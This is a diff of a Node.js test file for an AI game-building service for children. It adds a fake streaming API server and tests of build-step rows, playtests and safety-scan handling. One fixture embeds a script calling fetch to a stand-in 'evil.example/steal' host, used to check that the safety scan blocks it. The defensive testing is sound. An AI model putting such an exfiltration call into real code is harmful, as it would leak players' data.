@@ -20,16 +20,22 @@ const fake = http.createServer((req, res) => {
       res.setHeader('content-type', 'application/json');
       return res.end(JSON.stringify({ id: 'msg_x', type: 'message', role: 'assistant', model: b.model, content: [{ type: 'text', text }], stop_reason: 'end_turn', stop_sequence: null, usage: { input_tokens: 10, output_tokens: 5 } }));
     }
-    const blocks = script.shift() || [{ type: 'text', text: 'Done.' }];
+    // A script entry is a list of blocks, { blocks, stop } (to force a stop_reason such as 'max_tokens'), or 'error400'.
+    const entry = script.shift() || [{ type: 'text', text: 'Done.' }];
+    if (entry === 'error400') { res.writeHead(400, { 'content-type': 'application/json' }); return res.end(JSON.stringify({ type: 'error', error: { type: 'invalid_request_error', message: 'x' } })); }
+    const blocks = Array.isArray(entry) ? entry : entry.blocks;
     res.writeHead(200, { 'content-type': 'text/event-stream' });
     const ev = (name, data) => res.write(`event: ${name}\ndata: ${JSON.stringify({ type: name, ...data })}\n\n`);
     ev('message_start', { message: { id: 'msg_s', type: 'message', role: 'assistant', model: b.model, content: [], stop_reason: null, stop_sequence: null, usage: { input_tokens: 100, output_tokens: 0, cache_read_input_tokens: 50 } } });
     blocks.forEach((blk, i) => {
       if (blk.type === 'text') { ev('content_block_start', { index: i, content_block: { type: 'text', text: '' } }); for (const part of blk.text.match(/.{1,8}/gs)) ev('content_block_delta', { index: i, delta: { type: 'text_delta', text: part } }); }
+      // Thinking as current models stream it by default: an empty thinking text, then only a signature.
+      else if (blk.type === 'thinking') { ev('content_block_start', { index: i, content_block: { type: 'thinking', thinking: '', signature: '' } }); ev('content_block_delta', { index: i, delta: { type: 'signature_delta', signature: 'sig-fake' } }); }
+      else if (blk.type === 'redacted_thinking') ev('content_block_start', { index: i, content_block: { type: 'redacted_thinking', data: 'opaque' } });
       else { ev('content_block_start', { index: i, content_block: { type: 'tool_use', id: `tu_${i}_${requests.length}`, name: blk.name, input: {} } }); const j = JSON.stringify(blk.input); for (let k = 0; k < j.length; k += 500) ev('content_block_delta', { index: i, delta: { type: 'input_json_delta', partial_json: j.slice(k, k + 500) } }); }
       ev('content_block_stop', { index: i });
     });
-    ev('message_delta', { delta: { stop_reason: blocks.some(x => x.type === 'tool_use') ? 'tool_use' : 'end_turn', stop_sequence: null }, usage: { output_tokens: 42 } });
+    ev('message_delta', { delta: { stop_reason: entry.stop || (blocks.some(x => x.type === 'tool_use') ? 'tool_use' : 'end_turn'), stop_sequence: null }, usage: { output_tokens: 42 } });
     ev('message_stop', {}); res.end();
   });
 });
@@ -163,4 +169,180 @@ test('review attaches game pictures when screenshots are available', { skip: !ex
     assert.equal(imgs[0].source.type, 'base64'); assert.equal(imgs[0].source.media_type, 'image/jpeg');
     assert.match(blocks[0].text, /Pictures: \d+ attached/);
   } finally { config.snapshots = false; config.chromiumPath = ''; await snapshot.closeBrowser(); }
+});
+
+// ---- Live build steps (steps.js) with the Claude provider ----------------------------------------------------
+const { TOOLS } = await import('../../server/builder/prompt.js');
+const { tEn } = await import('../../server/i18n/index.js');
+/** step + stepinfo events -> one object per row (without i), in row order. */
+const rowsOf = events => { const rows = []; for (const [n, d] of events) { if (n === 'step') rows[d.i - 1] = { ...d }; else if (n === 'stepinfo') Object.assign(rows[d.i - 1], d); } return rows.map(({ i, ...r }) => r); };
+const recRows = rec => rec.s.map(([key, , f]) => ({ key, ...(f || {}) }));
+const idx = (events, name, pred = () => true) => events.findIndex(([n, d]) => n === name && pred(d));
+// 100 lines, about 3 KB, so the input streams in several 500-byte pieces.
+const BIG = ['<title>Fox Hop</title><style>body{margin:0}</style><canvas id="c"></canvas><script>', 'const CONFIG = { speed: 1, size: 2 };',
+  ...Array.from({ length: 97 }, (_, k) => `// ${k + 1}: the fox hops over logs`), 'BRB.sfx.play("jump");</script>'].join('\n');
+async function stepTurn(u, g, text, rounds) {
+  script.push(...rounds);
+  const events = []; const r = await runTurn({ user: u, gameId: g.id, text, emit: (n, d) => events.push([n, d]) });
+  assert.equal(script.length, 0, 'every scripted round was used');
+  return { r, events, rows: rowsOf(events), done: events.find(e => e[0] === 'done')[1] };
+}
+
+test('tool schema: notes comes first in write_game and edit_game, and both fields are required', () => {
+  for (const [name, other] of [['write_game', 'html'], ['edit_game', 'edits']]) {
+    const tool = TOOLS.find(t => t.name === name);
+    assert.deepEqual(Object.keys(tool.input_schema.properties), ['notes', other], name);
+    assert.deepEqual(tool.input_schema.required, ['notes', other]);
+    assert.match(tool.description, new RegExp(`Write notes first, then ${other}\\.`));
+    assert.match(tool.input_schema.properties.notes.description, new RegExp(`^Write this FIRST, before ${other}:`));
+  }
+  assert.match(SYSTEM_PROMPT, /write_game\(notes, html\)/); assert.match(SYSTEM_PROMPT, /edit_game\(notes, edits\)/);
+  assert.match(SYSTEM_PROMPT, /notes comes first/);
+});
+
+test('build steps: rounds, a real thinking block, the AI\'s plan streamed first, live counters, failures on their own row', async () => {
+  assert.equal(BIG.split('\n').length, 100); assert.ok(BIG.length > 2500);
+  const u = auth.createUser({ username: 'StepsKid', password: 'secret1' }); const g = games.createGame(u.id, {});
+  const before = requests.filter(x => x.body.stream).length;
+  const { r, events, rows, done } = await stepTurn(u, g, 'a fox jumping game', [
+    [{ type: 'thinking' }, { type: 'text', text: "Here's my plan: a fox that hops over logs. " }, { type: 'tool_use', name: 'set_game', input: { title: 'Fox Hop', icon: '🦊', category: 'arcade' } }, { type: 'tool_use', name: 'write_game', input: { notes: 'First version', html: BIG } }],
+    [{ type: 'tool_use', name: 'edit_game', input: { notes: 'Oops', edits: [{ find: 'speed: 9', replace: 'speed: 3' }] } }],
+    [{ type: 'tool_use', name: 'edit_game', input: { notes: 'Faster and bigger fox', edits: [{ find: 'speed: 1', replace: 'speed: 2' }, { find: 'size: 2', replace: 'size: 3' }] } }],
+    [{ type: 'tool_use', name: 'test_notes', input: { checklist: ['Hop over a log'] } }, { type: 'tool_use', name: 'ask_user', input: { question: 'What next?', options: ['Make it harder', 'Add a level'] } }],
+  ]);
+  assert.equal(r.ok, true, JSON.stringify(events.filter(e => e[0] === 'error')));
+  assert.deepEqual(rows.map(x => x.key), ['screen', 'think', 'write', 'name', 'check', 'think', 'edit', 'think', 'edit', 'check', 'think', 'notes', 'ask']);
+  assert.deepEqual(rows[0], { key: 'screen' });
+  assert.deepEqual(rows[1], { key: 'think', n: 1, c: 'start', th: 1 }, 'round 1: first message, a thinking block really streamed, no game yet');
+  assert.deepEqual(rows[2], { key: 'write', plan: 'First version', l: 100 });
+  assert.deepEqual(rows[3], { key: 'name', title: 'Fox Hop', icon: '🦊' }, 'set_game runs first (block order), after the write row started');
+  assert.equal(rows[4].key, 'check'); assert.equal(rows[4].v, 1); assert.ok(['pass', 'flag'].includes(rows[4].st), rows[4].st);
+  assert.deepEqual(rows[5], { key: 'think', n: 2, c: 'next' }, 'no thinking block: no th');
+  assert.deepEqual(rows[6], { key: 'edit', plan: 'Oops', e: 1, ok: false }, 'the failed edit is marked');
+  assert.deepEqual(rows[7], { key: 'think', n: 3, c: 'retry' });
+  assert.deepEqual(rows[8], { key: 'edit', plan: 'Faster and bigger fox', e: 2 });
+  assert.equal(rows[9].key, 'check'); assert.equal(rows[9].v, 2);
+  assert.deepEqual(rows[10], { key: 'think', n: 4, c: 'next' });
+  // The plan streamed before the code finished (notes first), and the lines counter ended exact.
+  const infos = events.map((e, k) => [k, e[0], e[1]]).filter(([, n, d]) => n === 'stepinfo' && d.i === 3);
+  const plan = infos.find(([, , d]) => d.plan); const lastL = infos.filter(([, , d]) => 'l' in d).at(-1);
+  assert.ok(plan[0] < lastL[0], 'the plan stepinfo came before the last lines stepinfo');
+  assert.ok(!('l' in plan[2]) || plan[2].l < 100, 'the code was still streaming when the plan arrived');
+  assert.equal(lastL[2].l, 100);
+  // Each row comes before its card; a failure marks its own row (i = 7), not the newest.
+  assert.ok(idx(events, 'step', s => s.key === 'write') < idx(events, 'step', s => s.key === 'name'));
+  assert.ok(idx(events, 'step', s => s.key === 'name') < idx(events, 'meta') && idx(events, 'meta') < idx(events, 'step', s => s.key === 'check'));
+  assert.ok(idx(events, 'step', s => s.key === 'check') < idx(events, 'version'));
+  assert.deepEqual(events.filter(e => e[0] === 'stepinfo' && e[1].ok === false).map(e => e[1].i), [7]);
+  assert.equal(idx(events, 'progress'), -1, 'the old progress event is gone');
+  // The record: same rows, AI mode, rounds and tokens; stored last in the transcript.
+  assert.equal(done.steps.p, 'ai'); assert.equal(done.steps.r, 4); assert.equal(done.steps.end, 'ok');
+  assert.ok(done.steps.ti >= 600 && done.steps.to >= 168, 'tokens read and written');
+  assert.deepEqual(recRows(done.steps), rows);
+  assert.deepEqual(loadChat(g.id).messages.at(-1).events.at(-1), ['steps', done.steps]);
+  // The request itself was not changed to get thinking.
+  for (const c of requests.filter(x => x.body.stream).slice(before)) { assert.equal(c.body.thinking, undefined); assert.equal(c.body.temperature, undefined); }
+  // Next turn: round 1 also reads the game (g), and the model never sees the steps record.
+  const next = await stepTurn(u, g, 'thanks', [[{ type: 'text', text: 'Sure!' }]]);
+  assert.deepEqual(next.rows, [{ key: 'screen' }, { key: 'think', n: 1, c: 'start', g: 1 }]);
+  const sent = JSON.stringify(requests.filter(x => x.body.stream).at(-1).body.messages);
+  assert.match(sent, /Built version 2: Faster and bigger fox/);
+  assert.doesNotMatch(sent, /"steps"|"th":|\["screen"|"plan"/);
+});
+
+test('build steps: notes after html still give the plan; long notes come from the real input; a playtest without screenshots says it could not run; a cut-off call is marked', async () => {
+  const u = auth.createUser({ username: 'StepsKid2', password: 'secret1' }); const g = games.createGame(u.id, {});
+  const { events, rows, done } = await stepTurn(u, g, 'a fox game', [
+    [{ type: 'tool_use', name: 'write_game', input: { html: BIG, notes: 'Old order notes' } }],
+    [{ type: 'tool_use', name: 'edit_game', input: { notes: '  Z' + 'z'.repeat(4999), edits: [{ find: 'speed: 1', replace: 'speed: 2' }] } }],
+    [{ type: 'tool_use', name: 'playtest_game', input: {} }],
+    { blocks: [{ type: 'tool_use', name: 'write_game', input: { notes: 'Too long', html: BIG } }], stop: 'max_tokens' },
+    [{ type: 'redacted_thinking' }, { type: 'text', text: 'I will make it shorter.' }],
+  ]);
+  assert.deepEqual(rows.map(x => x.key), ['screen', 'think', 'write', 'check', 'think', 'edit', 'check', 'think', 'playtest', 'think', 'write', 'think']);
+  assert.deepEqual(rows[2], { key: 'write', l: 100, plan: 'Old order notes' }, 'old key order: the plan arrives at the end');
+  assert.deepEqual(rows[5], { key: 'edit', e: 1, plan: 'Z' + 'z'.repeat(119) }, 'notes too long to stream: the plan is the real notes, cleaned and capped');
+  assert.ok(idx(events, 'stepinfo', d => d.i === 6 && d.plan) > idx(events, 'step', s => s.key === 'check' && s.v === 2), 'set after the tool ran');
+  assert.deepEqual(rows[7], { key: 'think', n: 3, c: 'next' });
+  // Playtesting is off in unit tests: the AI asked for one, so the row is there, marked as not run (never as a test).
+  assert.deepEqual(rows[8], { key: 'playtest', v: 2, ok: false }, 'an attempted playtest says it could not run');
+  assert.equal(idx(events, 'playtest'), -1, 'no playtest card: nothing was tested');
+  assert.deepEqual(rows[9], { key: 'think', n: 4, c: 'retry' }, 'the next round reads that error, and the card shows it');
+  assert.deepEqual(rows[10], { key: 'write', plan: 'Too long', l: 100, ok: false, why: 'cut' });
+  assert.deepEqual(rows[11], { key: 'think', n: 5, c: 'retry', th: 1 }, 'redacted thinking counts as thinking too');
+  assert.equal(done.steps.end, 'ok'); assert.equal(done.steps.r, 5);
+});
+
+test('build steps: a failed safety scan gives "reading the safety report" rounds and exactly two fix rows', async () => {
+  const u = auth.createUser({ username: 'StepsKid3', password: 'secret1' }); const g = games.createGame(u.id, {});
+  const BAD = '<title>x</title><style>b{}</style><canvas></canvas><script>fetch("https://evil.example/steal")</script>';
+  const { events, rows } = await stepTurn(u, g, 'a fox game', [1, 2, 3].map(k => [{ type: 'tool_use', name: 'write_game', input: { notes: `Try ${k}`, html: BAD } }]));
+  // k = the must-fix problems the version card lists, so the row and the card never disagree.
+  const k = events.find(e => e[0] === 'version')[1].issues.filter(x => x.startsWith('Must fix')).length;
+  assert.ok(k >= 1);
+  assert.deepEqual(rows, [
+    { key: 'screen' }, { key: 'think', n: 1, c: 'start' }, { key: 'write', plan: 'Try 1', l: 1 }, { key: 'check', st: 'fail', v: 1, k },
+    { key: 'think', n: 2, c: 'scan' }, { key: 'fix', via: 'write', plan: 'Try 2', l: 1 }, { key: 'check', st: 'fail', v: 2, k },
+    { key: 'think', n: 3, c: 'scan' }, { key: 'fix', via: 'write', plan: 'Try 3', l: 1 }, { key: 'check', st: 'fail', v: 3, k },
+  ]);
+  assert.ok(events.filter(e => e[0] === 'text').map(e => e[1].text).join('').includes(tEn('builder.scanStillFailing')));
+});
+
+test('build steps: a tool that failed without a row of its own leads to "what\'s next"; a flagged scan counts what it listed', async () => {
+  const u = auth.createUser({ username: 'StepsKid7', password: 'secret1' }); const g = games.createGame(u.id, {});
+  // Two scripts from libraries nobody reviewed: two flag issues on one version.
+  const FLAGGED = BIG.replace('<script>', '<script src="https://cdnjs.cloudflare.com/ajax/libs/nope/1.0/a.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/nope/1.0/b.js"></script><script>');
+  const { rows, events } = await stepTurn(u, g, 'a fox game', [
+    [{ type: 'tool_use', name: 'set_game', input: { category: 'not-a-category' } }],
+    [{ type: 'tool_use', name: 'write_game', input: { notes: 'Fox with helpers', html: FLAGGED } }],
+    [{ type: 'text', text: 'Done!' }],
+  ]);
+  assert.deepEqual(rows.map(x => x.key), ['screen', 'think', 'think', 'write', 'check', 'think']);
+  assert.deepEqual(rows[2], { key: 'think', n: 2, c: 'next' }, 'set_game changed nothing and has no row: no "went wrong" round');
+  const v = events.find(e => e[0] === 'version')[1];
+  assert.equal(v.status, 'flag'); assert.equal(rows[4].st, 'flag');
+  assert.equal(rows[4].k, v.issues.length, 'the check row counts the same issues the version card lists');
+  assert.ok(rows[4].k >= 2, `issues: ${rows[4].k}`);
+});
+
+test('build steps: a provider error stops the card with end "error"', async () => {
+  const u = auth.createUser({ username: 'StepsKid4', password: 'secret1' }); const g = games.createGame(u.id, {});
+  const { r, events, rows, done } = await stepTurn(u, g, 'a fox game', ['error400']);
+  assert.equal(r.ok, false);
+  assert.equal(events.find(e => e[0] === 'error')[1].message, tEn('builder.errors.muddled'));
+  assert.deepEqual(rows, [{ key: 'screen' }, { key: 'think', n: 1, c: 'start' }]);
+  assert.equal(done.steps.end, 'error'); assert.equal(done.steps.r, 1);
+  assert.deepEqual(loadChat(g.id).messages.at(-1).events.at(-1), ['steps', done.steps]);
+});
+
+test('build steps: a real playtest with problems gives "looking at the pictures", then a fix row', { skip: !exe ? 'no Chromium' : false, timeout: 90_000 }, async () => {
+  const snapshot = await import('../../server/services/snapshot.js');
+  config.snapshots = true; config.chromiumPath = exe;
+  try {
+    const u = auth.createUser({ username: 'StepsKid5', password: 'secret1' }); const g = games.createGame(u.id, {});
+    const { events, rows } = await stepTurn(u, g, 'a fox game', [
+      [{ type: 'tool_use', name: 'write_game', input: { notes: 'First version', html: GAME } }],
+      [{ type: 'tool_use', name: 'playtest_game', input: {} }],
+      [{ type: 'tool_use', name: 'edit_game', input: { notes: 'Faster fox', edits: [{ find: 'speed: 1', replace: 'speed: 2' }] } }],
+      [{ type: 'text', text: 'Looks good now!' }],
+    ]);
+    assert.deepEqual(rows.map(x => x.key), ['screen', 'think', 'write', 'check', 'think', 'playtest', 'think', 'fix', 'check', 'think']);
+    const pt = rows[5];
+    assert.equal(pt.v, 1); assert.ok(pt.pics >= 1 && pt.pics <= 2, `pictures: ${pt.pics}`); assert.ok(pt.probs >= 1, 'the missing __brbTest hook is a problem');
+    assert.equal(pt.probs, events.find(e => e[0] === 'playtest')[1].problems, 'the same count as the playtest card');
+    assert.ok(idx(events, 'step', s => s.key === 'playtest') < idx(events, 'playtest'));
+    assert.deepEqual(rows[6], { key: 'think', n: 3, c: 'look' });
+    assert.deepEqual(rows[7], { key: 'fix', via: 'edit', plan: 'Faster fox', e: 1 });
+    assert.deepEqual(rows[9], { key: 'think', n: 4, c: 'next' });
+  } finally { config.snapshots = false; config.chromiumPath = ''; await snapshot.closeBrowser(); }
+});
+
+test('build steps: starting from the ready-made 3D world gives a template row, then the safety check', async () => {
+  const u = auth.createUser({ username: 'StepsKid6', password: 'secret1' }); const g = games.createGame(u.id, {});
+  const { events, rows } = await stepTurn(u, g, 'make a 3D game with a fox', [
+    [{ type: 'tool_use', name: 'start_from_template', input: { template: 'island', notes: 'Started a 3D island' } }],
+    [{ type: 'text', text: 'Your 3D island is ready!' }],
+  ]);
+  assert.deepEqual(rows, [{ key: 'screen' }, { key: 'think', n: 1, c: 'start' }, { key: 'template' }, { key: 'check', st: 'pass', v: 1 }, { key: 'think', n: 2, c: 'next' }]);
+  assert.ok(idx(events, 'step', s => s.key === 'check') < idx(events, 'version'));
 });
